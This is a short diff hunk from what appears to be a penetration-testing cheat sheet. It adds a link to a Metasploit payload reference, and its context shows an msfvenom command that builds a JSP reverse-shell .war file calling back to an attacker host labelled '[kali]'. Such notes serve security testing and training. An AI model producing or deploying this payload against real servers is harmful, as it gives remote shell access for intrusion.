@@ -811,6 +811,8 @@ $ python pyinstaller.py --onefile <pythonscript>
 
 ## MSFVenom payload generation
 
+Metasploit payload cheatsheet: https://netsec.ws/?p=331
+
 Java / .war
 ```
 $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=[kali] LPORT=9999 -f war -o rshell.war
